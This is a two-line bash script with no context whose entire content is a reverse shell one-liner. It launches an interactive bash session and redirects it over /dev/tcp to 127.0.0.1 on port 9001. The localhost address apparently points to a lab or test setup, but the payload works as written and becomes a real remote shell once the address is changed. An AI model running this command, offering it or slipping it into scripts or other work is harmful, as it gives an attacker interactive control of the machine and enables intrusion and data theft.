#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/9001 0>&1
